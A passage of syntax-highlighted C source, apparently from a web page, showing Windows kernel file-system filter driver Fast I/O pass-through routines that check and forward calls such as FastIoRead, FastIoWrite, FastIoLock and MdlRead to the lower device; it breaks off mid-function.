class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOLEAN <span class="title">FastIoRead</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    PFILE_OBJECT FileObject,</span></span></span><br><span class="line"><span class="params"><span class="function">    PLARGE_INTEGER FileOffset,</span></span></span><br><span class="line"><span class="params"><span class="function">    ULONG Length,</span></span></span><br><span class="line"><span class="params"><span class="function">    BOOLEAN Wait,</span></span></span><br><span class="line"><span class="params"><span class="function">    ULONG LockKey,</span></span></span><br><span class="line"><span class="params"><span class="function">    PVOID Buffer,</span></span></span><br><span class="line"><span class="params"><span class="function">    PIO_STATUS_BLOCK IoStatus,</span></span></span><br><span class="line"><span class="params"><span class="function">    PDEVICE_OBJECT DeviceObject)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="function">BEGIN_FAST_IO</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">    <span class="title">if</span> <span class="params">(FastIoDispatch-&gt;FastIoRead == <span class="literal">NULL</span>)</span></span></span><br><span class="line"><span class="function">            <span class="keyword">goto</span> Exit</span>;</span><br><span class="line"></span><br><span class="line">    IsOk = FastIoDispatch-&gt;<span class="built_in">FastIoRead</span>(</span><br><span class="line">        FileObject,</span><br><span class="line">        FileOffset,</span><br><span class="line">        Length,</span><br><span class="line">        Wait,</span><br><span class="line">        LockKey,</span><br><span class="line">        Buffer,</span><br><span class="line">        IoStatus,</span><br><span class="line">        v2);</span><br><span class="line"></span><br><span class="line">    END_FAST_IO</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">BOOLEAN <span class="title">FastIoWrite</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    PFILE_OBJECT FileObject,</span></span></span><br><span class="line"><span class="params"><span class="function">    PLARGE_INTEGER FileOffset,</span></span></span><br><span class="line"><span class="params"><span class="function">    ULONG Length,</span></span></span><br><span class="line"><span class="params"><span class="function">    BOOLEAN Wait,</span></span></span><br><span class="line"><span class="params"><span class="function">    ULONG LockKey,</span></span></span><br><span class="line"><span class="params"><span class="function">    PVOID Buffer,</span></span></span><br><span class="line"><span class="params"><span class="function">    PIO_STATUS_BLOCK IoStatus,</span></span></span><br><span class="line"><span class="params"><span class="function">    PDEVICE_OBJECT DeviceObject)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="function">BEGIN_FAST_IO</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">        <span class="title">if</span> <span class="params">(FastIoDispatch-&gt;FastIoWrite == <span class="literal">NULL</span>)</span></span></span><br><span class="line"><span class="function">            <span class="keyword">goto</span> Exit</span>;</span><br><span class="line"></span><br><span class="line">    IsOk = FastIoDispatch-&gt;<span class="built_in">FastIoWrite</span>(</span><br><span class="line">        FileObject,</span><br><span class="line">        FileOffset,</span><br><span class="line">        Length,</span><br><span class="line">        Wait,</span><br><span class="line">        LockKey,</span><br><span class="line">        Buffer,</span><br><span class="line">        IoStatus,</span><br><span class="line">        v2);</span><br><span class="line"></span><br><span class="line">    END_FAST_IO</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/////////////////////////////////////////////////////////////////////////////</span></span><br><span class="line"></span><br><span class="line"><span class="function">BOOLEAN <span class="title">FastIoQueryBasicInfo</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    PFILE_OBJECT FileObject,</span></span></span><br><span class="line"><span class="params"><span class="function">    BOOLEAN Wait,</span></span></span><br><span class="line"><span class="params"><span class="function">    PFILE_BASIC_INFORMATION Buffer,</span></span></span><br><span class="line"><span class="params"><span class="function">    PIO_STATUS_BLOCK IoStatus,</span></span></span><br><span class="line"><span class="params"><span class="function">    PDEVICE_OBJECT DeviceObject)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="function">BEGIN_FAST_IO</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">        <span class="title">if</span> <span class="params">(FastIoDispatch-&gt;FastIoQueryBasicInfo == <span class="literal">NULL</span>)</span></span></span><br><span class="line"><span class="function">            <span class="keyword">goto</span> Exit</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    IsOk = FastIoDispatch-&gt;<span class="built_in">FastIoQueryBasicInfo</span>(</span><br><span class="line">        FileObject,</span><br><span class="line">        Wait,</span><br><span class="line">        Buffer,</span><br><span class="line">        IoStatus,</span><br><span class="line">        v2);</span><br><span class="line"></span><br><span class="line">    END_FAST_IO</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/////////////////////////////////////////////////////////////////////////////</span></span><br><span class="line"></span><br><span class="line"><span class="function">BOOLEAN <span class="title">FastIoQueryStandardInfo</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    PFILE_OBJECT FileObject,</span></span></span><br><span class="line"><span class="params"><span class="function">    BOOLEAN Wait,</span></span></span><br><span class="line"><span class="params"><span class="function">    PFILE_STANDARD_INFORMATION Buffer,</span></span></span><br><span class="line"><span class="params"><span class="function">    PIO_STATUS_BLOCK IoStatus,</span></span></span><br><span class="line"><span class="params"><span class="function">    PDEVICE_OBJECT DeviceObject)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="function">BEGIN_FAST_IO</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">        <span class="title">if</span> <span class="params">(FastIoDispatch-&gt;FastIoQueryStandardInfo == <span class="literal">NULL</span>)</span></span></span><br><span class="line"><span class="function">            <span class="keyword">goto</span> Exit</span>;</span><br><span class="line"></span><br><span class="line">    IsOk = FastIoDispatch-&gt;<span class="built_in">FastIoQueryStandardInfo</span>(</span><br><span class="line">        FileObject,</span><br><span class="line">        Wait,</span><br><span class="line">        Buffer,</span><br><span class="line">        IoStatus,</span><br><span class="line">        v2);</span><br><span class="line"></span><br><span class="line">    END_FAST_IO;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/////////////////////////////////////////////////////////////////////////////</span></span><br><span class="line"></span><br><span class="line"><span class="function">BOOLEAN <span class="title">FastIoLock</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    PFILE_OBJECT FileObject,</span></span></span><br><span class="line"><span class="params"><span class="function">    PLARGE_INTEGER FileOffset,</span></span></span><br><span class="line"><span class="params"><span class="function">    PLARGE_INTEGER Length,</span></span></span><br><span class="line"><span class="params"><span class="function">    PEPROCESS ProcessId,</span></span></span><br><span class="line"><span class="params"><span class="function">    ULONG Key,</span></span></span><br><span class="line"><span class="params"><span class="function">    BOOLEAN FailImmediately,</span></span></span><br><span class="line"><span class="params"><span class="function">    BOOLEAN ExclusiveLock,</span></span></span><br><span class="line"><span class="params"><span class="function">    PIO_STATUS_BLOCK IoStatus,</span></span></span><br><span class="line"><span class="params"><span class="function">    PDEVICE_OBJECT DeviceObject)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="function">BEGIN_FAST_IO</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">        <span class="title">if</span> <span class="params">(FastIoDispatch-&gt;FastIoLock == <span class="literal">NULL</span>)</span></span></span><br><span class="line"><span class="function">            <span class="keyword">goto</span> Exit</span>;</span><br><span class="line"></span><br><span class="line">    IsOk = FastIoDispatch-&gt;<span class="built_in">FastIoLock</span>(</span><br><span class="line">        FileObject,</span><br><span class="line">        FileOffset,</span><br><span class="line">        Length,</span><br><span class="line">        ProcessId,</span><br><span class="line">        Key,</span><br><span class="line">        FailImmediately,</span><br><span class="line">        ExclusiveLock,</span><br><span class="line">        IoStatus,</span><br><span class="line">        v2);</span><br><span class="line"></span><br><span class="line">    END_FAST_IO</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/////////////////////////////////////////////////////////////////////////////</span></span><br><span class="line"></span><br><span class="line"><span class="function">BOOLEAN <span class="title">FastIoUnlockSingle</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    PFILE_OBJECT FileObject,</span></span></span><br><span class="line"><span class="params"><span class="function">    PLARGE_INTEGER FileOffset,</span></span></span><br><span class="line"><span class="params"><span class="function">    PLARGE_INTEGER Length,</span></span></span><br><span class="line"><span class="params"><span class="function">    PEPROCESS ProcessId,</span></span></span><br><span class="line"><span class="params"><span class="function">    ULONG Key,</span></span></span><br><span class="line"><span class="params"><span class="function">    PIO_STATUS_BLOCK IoStatus,</span></span></span><br><span class="line"><span class="params"><span class="function">    PDEVICE_OBJECT DeviceObject)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="function">BEGIN_FAST_IO</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">        <span class="title">if</span> <span class="params">(FastIoDispatch-&gt;FastIoUnlockSingle == <span class="literal">NULL</span>)</span></span></span><br><span class="line"><span class="function">            <span class="keyword">goto</span> Exit</span>;</span><br><span class="line"></span><br><span class="line">    IsOk = FastIoDispatch-&gt;<span class="built_in">FastIoUnlockSingle</span>(</span><br><span class="line">        FileObject,</span><br><span class="line">        FileOffset,</span><br><span class="line">        Length,</span><br><span class="line">        ProcessId,</span><br><span class="line">        Key,</span><br><span class="line">        IoStatus,</span><br><span class="line">        v2);</span><br><span class="line"></span><br><span class="line">    END_FAST_IO</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/////////////////////////////////////////////////////////////////////////////</span></span><br><span class="line"></span><br><span class="line"><span class="function">BOOLEAN <span class="title">FastIoUnlockAll</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    PFILE_OBJECT FileObject,</span></span></span><br><span class="line"><span class="params"><span class="function">    PEPROCESS ProcessId,</span></span></span><br><span class="line"><span class="params"><span class="function">    PIO_STATUS_BLOCK IoStatus,</span></span></span><br><span class="line"><span class="params"><span class="function">    PDEVICE_OBJECT DeviceObject)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="function">BEGIN_FAST_IO</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">        <span class="title">if</span> <span class="params">(FastIoDispatch-&gt;FastIoUnlockAll == <span class="literal">NULL</span>)</span></span></span><br><span class="line"><span class="function">            <span class="keyword">goto</span> Exit</span>;</span><br><span class="line"></span><br><span class="line">    IsOk = FastIoDispatch-&gt;<span class="built_in">FastIoUnlockAll</span>(</span><br><span class="line">        FileObject,</span><br><span class="line">        ProcessId,</span><br><span class="line">        IoStatus,</span><br><span class="line">        v2);</span><br><span class="line"></span><br><span class="line">    END_FAST_IO</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/////////////////////////////////////////////////////////////////////////////</span></span><br><span class="line"></span><br><span class="line"><span class="function">BOOLEAN <span class="title">FastIoUnlockAllByKey</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    PFILE_OBJECT FileObject,</span></span></span><br><span class="line"><span class="params"><span class="function">    PVOID ProcessId,</span></span></span><br><span class="line"><span class="params"><span class="function">    ULONG Key,</span></span></span><br><span class="line"><span class="params"><span class="function">    PIO_STATUS_BLOCK IoStatus,</span></span></span><br><span class="line"><span class="params"><span class="function">    PDEVICE_OBJECT DeviceObject)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="function">BEGIN_FAST_IO</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">        <span class="title">if</span> <span class="params">(FastIoDispatch-&gt;FastIoUnlockAllByKey == <span class="literal">NULL</span>)</span></span></span><br><span class="line"><span class="function">            <span class="keyword">goto</span> Exit</span>;</span><br><span class="line"></span><br><span class="line">    IsOk = FastIoDispatch-&gt;<span class="built_in">FastIoUnlockAllByKey</span>(</span><br><span class="line">        FileObject,</span><br><span class="line">        ProcessId,</span><br><span class="line">        Key,</span><br><span class="line">        IoStatus,</span><br><span class="line">        v2);</span><br><span class="line"></span><br><span class="line">    END_FAST_IO</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/////////////////////////////////////////////////////////////////////////////</span></span><br><span class="line"></span><br><span class="line"><span class="function">BOOLEAN <span class="title">FastIoDeviceControl</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    PFILE_OBJECT FileObject,</span></span></span><br><span class="line"><span class="params"><span class="function">    BOOLEAN Wait,</span></span></span><br><span class="line"><span class="params"><span class="function">    PVOID InputBuffer,</span></span></span><br><span class="line"><span class="params"><span class="function">    ULONG InputBufferLength,</span></span></span><br><span class="line"><span class="params"><span class="function">    PVOID OutputBuffer,</span></span></span><br><span class="line"><span class="params"><span class="function">    ULONG OutputBufferLength,</span></span></span><br><span class="line"><span class="params"><span class="function">    ULONG IoControlCode,</span></span></span><br><span class="line"><span class="params"><span class="function">    PIO_STATUS_BLOCK IoStatus,</span></span></span><br><span class="line"><span class="params"><span class="function">    PDEVICE_OBJECT DeviceObject)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="function">BEGIN_FAST_IO</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">        <span class="title">if</span> <span class="params">(FastIoDispatch-&gt;FastIoDeviceControl == <span class="literal">NULL</span>)</span></span></span><br><span class="line"><span class="function">            <span class="keyword">goto</span> Exit</span>;</span><br><span class="line"></span><br><span class="line">    IsOk = FastIoDispatch-&gt;<span class="built_in">FastIoDeviceControl</span>(</span><br><span class="line">        FileObject,</span><br><span class="line">        Wait,</span><br><span class="line">        InputBuffer,</span><br><span class="line">        InputBufferLength,</span><br><span class="line">        OutputBuffer,</span><br><span class="line">        OutputBufferLength,</span><br><span class="line">        IoControlCode,</span><br><span class="line">        IoStatus,</span><br><span class="line">        v2);</span><br><span class="line"></span><br><span class="line">    END_FAST_IO</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/////////////////////////////////////////////////////////////////////////////</span></span><br><span class="line"></span><br><span class="line"><span class="function">BOOLEAN <span class="title">FastIoQueryNetworkOpenInfo</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    PFILE_OBJECT FileObject,</span></span></span><br><span class="line"><span class="params"><span class="function">    BOOLEAN Wait,</span></span></span><br><span class="line"><span class="params"><span class="function">    PFILE_NETWORK_OPEN_INFORMATION Buffer,</span></span></span><br><span class="line"><span class="params"><span class="function">    PIO_STATUS_BLOCK IoStatus,</span></span></span><br><span class="line"><span class="params"><span class="function">    PDEVICE_OBJECT DeviceObject)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="function">BEGIN_FAST_IO</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">        <span class="title">if</span> <span class="params">(FastIoDispatch-&gt;FastIoQueryNetworkOpenInfo == <span class="literal">NULL</span>)</span></span></span><br><span class="line"><span class="function">            <span class="keyword">goto</span> Exit</span>;</span><br><span class="line"></span><br><span class="line">    IsOk = FastIoDispatch-&gt;<span class="built_in">FastIoQueryNetworkOpenInfo</span>(</span><br><span class="line">        FileObject,</span><br><span class="line">        Wait,</span><br><span class="line">        Buffer,</span><br><span class="line">        IoStatus,</span><br><span class="line">        v2);</span><br><span class="line"></span><br><span class="line">    END_FAST_IO</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/////////////////////////////////////////////////////////////////////////////</span></span><br><span class="line"></span><br><span class="line"><span class="function">BOOLEAN <span class="title">FastIoMdlRead</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    PFILE_OBJECT FileObject,</span></span></span><br><span class="line"><span class="params"><span class="function">    PLARGE_INTEGER FileOffset,</span></span></span><br><span class="line"><span class="params"><span class="function">    ULONG Length,</span></span></span><br><span class="line"><span class="params"><span class="function">    ULONG LockKey,</span></span></span><br><span class="line"><span class="params"><span class="function">    PMDL* MdlChain,</span></span></span><br><span class="line"><span class="params"><span class="function">    PIO_STATUS_BLOCK IoStatus,</span></span></span><br><span class="line"><span class="params"><span class="function">    PDEVICE_OBJECT DeviceObject)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="function">BEGIN_FAST_IO</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">        <span class="title">if</span> <span class="params">(FastIoDispatch-&gt;MdlRead == <span class="literal">NULL</span>)</span></span></span><br><span class="line"><span class="function">            <span class="keyword">goto</span> Exit</span>;</span><br><span class="line"></span><br><span class="line">    IsOk = FastIoDispatch-&gt;<span class="built_in">MdlRead</span>(</span><br><span class="line">        FileObject,</span><br><span class="line">        FileOffset,</span><br><span class="line">        Length,</span><br><span class="line">        LockKey,</span><br><span class="line">        MdlChain,</span><br><span class="line">        IoStatus,</span><br><span class="line">        v2);</span><br><span class="line"></span><br><span class="line">    END_FAST_IO</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/////////////////////////////////////////////////////////////////////////////</span></span><br><span class="line"></span><br><span class="line"><span class="function">BOOLEAN <span class="title">FastIoMdlReadComplete</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    PFILE_OBJECT FileObject,</span></span></span><br><span class="line"><span class="params"><span class="function">    PMDL MdlChain,</span></span></span><br><span class="line"><span class="params"><span class="function">    PDEVICE_OBJECT DeviceObject)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="function">BEGIN_FAST_IO</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">        <span class="title">if</span> <span class="params">(FastIoDispatch-&gt;MdlReadComplete == <span class="literal">NULL</span>)</span></span></span><br><span class="line"><span class="function">            <span class="keyword">goto</span> Exit</span>;</span><br><span class="line"></span><br><span class="line">    IsOk = FastIoDispatch-&gt;<span class="built_in">MdlReadComplete</span>(</span><br><span class="line">        FileObject,</span><br><span class="line">        MdlChain,</span><br><span class="line">        v2);</span><br><span class="line"></span><br><span class="line">    END_FAST_IO</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/////////////////////////////////////////////////////////////////////////////</span></span><br><span class="line"></span><br><span class="line"><span class="function">BOOLEAN <span class="title">FastIoPrepareMdlWrite</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    PFILE_OBJECT FileObject,</span></span></span><br><span class="line"><span class="params"><span class="function">    PLARGE_INTEGER FileOffset,</span></span></span><br><span class="line"><span class="params"><span class="function">    ULONG Length,</span></span></span><br><span class="line"><span class="params"><span class="function">    ULONG LockKey,</span></span></span><br><span class="line"><span class="params"><span class="function">    PMDL* MdlChain,</span></span></span><br><span class="line"><span class="params"><span class="function">    PIO_STATUS_BLOCK IoStatus,</span></span></span><br><span class="line"><span class="params"><span class="function">    PDEVICE_OBJECT DeviceObject)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="function">BEGIN_FAST_IO</span></span><br><span class="line"><span class="function"></span></span><br><span 